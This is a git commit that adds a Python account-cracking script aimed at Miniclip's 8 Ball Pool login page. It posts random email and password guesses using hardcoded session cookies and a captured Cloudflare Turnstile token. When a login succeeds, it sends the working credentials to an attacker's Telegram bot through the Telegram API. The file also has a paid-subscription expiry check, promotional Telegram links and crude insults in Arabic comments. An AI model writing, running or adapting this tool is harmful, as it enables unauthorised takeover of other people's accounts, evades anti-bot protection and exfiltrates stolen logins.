2b3f0348e4d2a83fed885cb2cf385380ee6fef7b
maoskjsksnsn6z <mbkgkgiu265@gmail.com>
2025-07-07 03:11:16 +0200

    Add files via upload

---
+++ apos.py
@@ -0,0 +1,147 @@
+print("ارسل اداتك ليتم فكه👺")
+print('@x_9_x_9_x')
+print('ارسل اداتك ليتم فكه ')
+#ذاه تخمط امك تناج 
+import requests,time
+import random
+import pyfiglet
+import webbrowser
+from threading import *
+#— — — — — — — — — — — — —
+import datetime
+import pytz
+import time
+end_datetime = datetime.datetime(2025,7, 10, 0, 00, 0) #
+iraq_timezone = pytz.timezone("Asia/Baghdad") #
+
+remaining_time = end_datetime.astimezone(iraq_timezone) - datetime.datetime.now(iraq_timezone)
+print(f"[-] \x1b[1;92m\x1b[38;5;211mالوقت المتبقي 🥲💔\x1b[38;5;122m : {remaining_time}")
+
+if datetime.datetime.now(iraq_timezone) >= end_datetime.astimezone(iraq_timezone):
+    print("[!] خلص الاشتراك راسل المطور\x1b[38;5;122m @x_9_x_9_x") #
+    exit(0)
+
+E = '\033[1;31m'
+Y = '\033[1;33m'
+Z = '\033[1;31m' #احمر
+X = '\033[1;33m' #اصفر
+Z1 = '\033[2;31m' #احمر ثاني
+F = '\033[2;32m' #اخضر
+A = '\033[2;34m'#اورق
+C = '\033[2;35m' #وردي
+S = '\033[2;36m'#سمائي
+G = '\033[1;34m' #ازرق فاتح
+HH='\033[1;34m' #ازرق فاتح
+M = '\x1b[1;37m'#ابیض
+W1 = '\x1b[1;97m'
+W2 = '\x1b[38;5;120m'
+W3 = '\x1b[38;5;204m'
+W4 = '\x1b[38;5;150m'
+W5 = '\x1b[1;33m'
+W6 = '\x1b[1;31m'
+W7 = "\033[1;33m"
+W8 = '\x1b[2;36m'
+W8 = f'\x1b[38;5;117m'
+W9 = "\033[1m\033[34m"
+#— — — — — — — — — — — — —
+GE,BE,GI,BI=0,0,0,0
+#— — — — — — — — — — — — —
+print(f"""\033[1;31m════════════════════════════════════════════════════════
+\033[1;34m
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡴⠟⠃⠀⠀⠙⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠋⠀⠀⠀⠀⠀⠀⠘⣆⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠾⢛⠒⠀⠀⠀⠀⠀⠀⠀⢸⡆⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣶⣄⡈⠓⢄⠠⡀⠀⠀⠀⣄⣷⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⣷⠀⠈⠱⡄⠑⣌⠆⠀⠀⡜⢻⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⡿⠳⡆⠐⢿⣆⠈⢿⠀⠀⡇⠘⡆⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⣿⣷⡇⠀⠀⠈⢆⠈⠆⢸⠀⠀⢣⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣿⣧⠀⠀⠈⢂⠀⡇⠀⠀⢨⠓⣄⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣿⣿⣿⣦⣤⠖⡏⡸⠀⣀⡴⠋⠀⠈⠢⡀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⠁⣹⣿⣿⣿⣷⣾⠽⠖⠊⢹⣀⠄⠀⠀⠀⠈⢣⡀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡟⣇⣰⢫⢻⢉⠉⠀⣿⡆⠀⠀⡸⡏⠀⠀⠀⠀⠀⠀⢇
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢨⡇⡇⠈⢸⢸⢸⠀⠀⡇⡇⠀⠀⠁⠻⡄⡠⠂⠀⠀⠀⠘
+⢤⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠛⠓⡇⠀⠸⡆⢸⠀⢠⣿⠀⠀⠀⠀⣰⣿⣵⡆⠀⠀⠀⠀
+⠈⢻⣷⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡿⣦⣀⡇⠀⢧⡇⠀⠀⢺⡟⠀⠀⠀⢰⠉⣰⠟⠊⣠⠂⠀⡸
+⠀⠀⢻⣿⣿⣷⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⢧⡙⠺⠿⡇⠀⠘⠇⠀⠀⢸⣧⠀⠀⢠⠃⣾⣌⠉⠩⠭⠍⣉⡇
+⠀⠀⠀⠻⣿⣿⣿⣿⣿⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣞⣋⠀⠈⠀⡳⣧⠀⠀⠀⠀⠀⢸⡏⠀⠀⡞⢰⠉⠉⠉⠉⠉⠓⢻⠃
+⠀⠀⠀⠀⠹⣿⣿⣿⣿⣿⣿⣷⡄⠀⠀⢀⣀⠠⠤⣤⣤⠤⠞⠓⢠⠈⡆⠀⢣⣸⣾⠆⠀⠀⠀⠀⠀⢀⣀⡼⠁⡿⠈⣉⣉⣒⡒⠢⡼⠀
+⠀⠀⠀⠀⠀⠘⣿⣿⣿⣿⣿⣿⣿⣎⣽⣶⣤⡶⢋⣤⠃⣠⡦⢀⡼⢦⣾⡤⠚⣟⣁⣀⣀⣀⣀⠀⣀⣈⣀⣠⣾⣅⠀⠑⠂⠤⠌⣩⡇⠀
+⠀⠀⠀⠀⠀⠀⠘⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡁⣺⢁⣞⣉⡴⠟⡀⠀⠀⠀⠁⠸⡅⠀⠈⢷⠈⠏⠙⠀⢹⡛⠀⢉⠀⠀⠀⣀⣀⣼⡇⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣽⣿⡟⢡⠖⣡⡴⠂⣀⣀⣀⣰⣁⣀⣀⣸⠀⠀⠀⠀⠈⠁⠀⠀⠈⠀⣠⠜⠋⣠⠁⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⣿⣿⡟⢿⣿⣿⣷⡟⢋⣥⣖⣉⠀⠈⢁⡀⠤⠚⠿⣷⡦⢀⣠⣀⠢⣄⣀⡠⠔⠋⠁⠀⣼⠃⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⡄⠈⠻⣿⣿⢿⣛⣩⠤⠒⠉⠁⠀⠀⠀⠀⠀⠉⠒⢤⡀⠉⠁⠀⠀⠀⠀⠀⢀⡿⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⢿⣤⣤⠴⠟⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠑⠤⠀⠀⠀⠀⠀⢩⠇⠀⠀⠀
+
+            \033[1;33m TLE :/ 
+             /
+\033[1;31m════════════════════════════════════════════════════════
+""")
+Token=input(f'{F} ➪ TOKEN :')
+print(f'{X}▬'*55)
+ID=input(f'{F} ➪ ID : ')
+webbrowser.open("https://t.me/cxxcxxax")
+print(f'{X}▬'*55)
+def mlha():
+        while True:
+                mlham = '1234567890qwertyuiopasdfghjklzxcvbnm'
+                us1=(''.join((random.choice(mlham)for i in range(10)))) + '@gmail.com'
+                us2=(''.join((random.choice(mlham)for i in range(9))))
+                email = us1
+                pas = us2
+
+                cookies = {
+                    'AWSALB': 'n5xp+qLQp0M9Mi0W6E3fiP8KrcT1OqkUcZV8tr3q+j6UHA8XF+QgQDr9JKe6Q7YJm7SJN2CW4T94vL35qGpLhLyqNMNbz61o97DLBbN1IvFfL38BBX0ADpFaX6Xp',
+                    'AWSALBCORS': 'n5xp+qLQp0M9Mi0W6E3fiP8KrcT1OqkUcZV8tr3q+j6UHA8XF+QgQDr9JKe6Q7YJm7SJN2CW4T94vL35qGpLhLyqNMNbz61o97DLBbN1IvFfL38BBX0ADpFaX6Xp',
+                    '_session_store': 'MTc0ODczOTIxMHxEWDhFQVFMX2dBQUJFQUVRQUFELUFVN19nQUFEQm5OMGNtbHVad3dLQUFoeVpYUjFjbTVVYndaemRISnBibWNNXy1jQV8tUXZiMkYxZEdneUwyRjFkR2h2Y21sNlpUOWpiR2xsYm5SZmFXUTljRzl2YkdoMVlpWmpiMlJsWDJOb1lXeHNaVzVuWlQxVWFGaGpORFJJWlZkWGFVbHROMU5vYVdKVloyeDFiMnBhYlZvdFUyVlNVek5MV0hsSmFrVjRZWFpqSm1OdlpHVmZZMmhoYkd4bGJtZGxYMjFsZEdodlpEMVRNalUySm1WNGRHVnlibUZzUFhCdmNuUmhiQ1p5WldScGNtVmpkRjkxY21rOWFIUjBjSE1sTTBFbE1rWWxNa1p0WlM1dGFXNXBZMnhwY0M1amIyMGxNa1p2WVhWMGFESWxNa1p6ZFdOalpYTnpKbkpsYzNCdmJuTmxYM1I1Y0dVOVkyOWtaU1p6WTI5d1pUMWhiR3dHYzNSeWFXNW5EQXNBQ1dOc2FXVnVkRjlwWkFaemRISnBibWNNQ1FBSGNHOXZiR2gxWWdaemRISnBibWNNREFBS1puSmhiV1ZmYlc5a1pRWnpkSEpwYm1jTUFnQUF83T8_C6IFUa-McNy-3tQC4rscwBje2lK2zOTyVmJ44U0=',
+                }
+
+                headers = {
+                    'authority': 'me.miniclip.com',
+                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+                    'accept-language': 'ar-JO,ar-AE;q=0.9,ar;q=0.8,en-AS;q=0.7,en;q=0.6,en-US;q=0.5',
+                    'cache-control': 'max-age=0',
+                    'content-type': 'application/x-www-form-urlencoded',
+                    # 'cookie': 'AWSALB=n5xp+qLQp0M9Mi0W6E3fiP8KrcT1OqkUcZV8tr3q+j6UHA8XF+QgQDr9JKe6Q7YJm7SJN2CW4T94vL35qGpLhLyqNMNbz61o97DLBbN1IvFfL38BBX0ADpFaX6Xp; AWSALBCORS=n5xp+qLQp0M9Mi0W6E3fiP8KrcT1OqkUcZV8tr3q+j6UHA8XF+QgQDr9JKe6Q7YJm7SJN2CW4T94vL35qGpLhLyqNMNbz61o97DLBbN1IvFfL38BBX0ADpFaX6Xp; _session_store=MTc0ODczOTIxMHxEWDhFQVFMX2dBQUJFQUVRQUFELUFVN19nQUFEQm5OMGNtbHVad3dLQUFoeVpYUjFjbTVVYndaemRISnBibWNNXy1jQV8tUXZiMkYxZEdneUwyRjFkR2h2Y21sNlpUOWpiR2xsYm5SZmFXUTljRzl2YkdoMVlpWmpiMlJsWDJOb1lXeHNaVzVuWlQxVWFGaGpORFJJWlZkWGFVbHROMU5vYVdKVloyeDFiMnBhYlZvdFUyVlNVek5MV0hsSmFrVjRZWFpqSm1OdlpHVmZZMmhoYkd4bGJtZGxYMjFsZEdodlpEMVRNalUySm1WNGRHVnlibUZzUFhCdmNuUmhiQ1p5WldScGNtVmpkRjkxY21rOWFIUjBjSE1sTTBFbE1rWWxNa1p0WlM1dGFXNXBZMnhwY0M1amIyMGxNa1p2WVhWMGFESWxNa1p6ZFdOalpYTnpKbkpsYzNCdmJuTmxYM1I1Y0dVOVkyOWtaU1p6WTI5d1pUMWhiR3dHYzNSeWFXNW5EQXNBQ1dOc2FXVnVkRjlwWkFaemRISnBibWNNQ1FBSGNHOXZiR2gxWWdaemRISnBibWNNREFBS1puSmhiV1ZmYlc5a1pRWnpkSEpwYm1jTUFnQUF83T8_C6IFUa-McNy-3tQC4rscwBje2lK2zOTyVmJ44U0=',
+                    'origin': 'https://me.miniclip.com',
+                    'referer': 'https://me.miniclip.com/login/pool',
+                    'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
+                    'sec-ch-ua-mobile': '?1',
+                    'sec-ch-ua-platform': '"Android"',
+                    'sec-fetch-dest': 'document',
+                    'sec-fetch-mode': 'navigate',
+                    'sec-fetch-site': 'same-origin',
+                    'sec-fetch-user': '?1',
+                    'upgrade-insecure-requests': '1',
+                    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
+                }
+
+                data = {
+                    'email': email,
+                    'password': pas,
+                    'cf-turnstile-response': '0.ab8sOaGMi4s102loIhF2LEGxLqF0vGL5AIKUl85axdw6sXUT1qWNZXy_Oaz5e2EMGNf_22YAX7-zRYaRmSLZLeH7LPs8kgYATiHcND67yrGELkBT3hVePCkRdKaOTNxwzrU5rPeBvM0PVVSHkU97awytfCfEBeruhhmPWk7QuH74OhsK5qVWtyPfwHG7Ug7LlPBIIp1GhNEDwEhk6Ks-yDApQywnj8pFYkASriFL6QL1mJ-CDn58pUZLPHdL4yoLofrzi6K2E-SfMkL2lRAb8knRsjqwejQda3B6EsMIXb2KczxT9b5rvCnomsSF4_4M98oJLMFs2AFiyblOjqrvAIdTd-AYipWpemEtz_0zqo_pJj4YIMpYiO19s8-g13r57-8IY_UkItmESEWIB1L-uyvvsTAZxoyHywyfFjPhMw-bR9CEwNT6vgBo52LKgMpJilzWf7bzEgYGyeBB2W8YgV6opp_JFNBw1pUS40Iu6skNh7wXsY2wJOfpxyDMqFqyAVBwuHMcILQDWM2ZPzoQ4GsZGxjGX5DqFNkMNN6J_VhAeVFkNM8uWWqxuTsNcjKV8As3N1VFwjjQgXY4IooXZljtI36RS-wk3ZbEtA88cCFnbblV-JkIYb6hmqOEumQLFtiSAJnK3Xwa-SmnvVjIS6dlseKXjOUZfN_K3Ggosy6ATun_r5_WUWtLOykIRc4hBjZ8KwPjQFugZvMa3MbmQglyCT4FCh_KnLtsMjlaU4eYZXd6wMLFO49LRKT5V9pzlvDZcoY95WqH1XNzQsTAtqCOSupbQFSwNNFAXn7LjjUXDalCS5I7A68cG4b6eEs32MQHN4iP4xP_jxYYT09TTBAL4LXIIWXxELWg6b23nmU.aJrLnxzxCkHur3B6-2K5lw.e5765d90176761717f8f1283f268c7ef6a2bf597c9df425216bd69091aca8788',
+                }
+
+                re = requests.post('https://me.miniclip.com/login/pool', cookies=cookies, headers=headers, data=data).text
+                if 'facebook_token' in re:
+                        print(f'{F} شـغـال ➪ ')
+                        print(f'{X}▬'*55)
+                        print(S+email)
+                        print(S+pas)
+                        R7 = (f'''https://api.telegram.org/bot{Token}/sendMessage?chat_id={ID}&text=
+♧ new account 8 bool ♧
+\n━━━━━━━━━━━━━•
+
+\n 𝙚𝙢𝙖𝙞𝙡 ➪ {email}
+
+\n 𝙥𝙖𝙨 ➪ {pas}
+
+\n━━━━━━━━━━━━━•
+BY : رسل اداتك ليتم فكه 
+@x_9_x_9_x
+  ''')
+                        i = requests.post(R7)
+                else:
+                        print(f'{Z1} مـسـتـخـدم ➪ ')
+mlha()
+
+#تبوكها بدون متذكر المصدر انيـ//ـج اختك
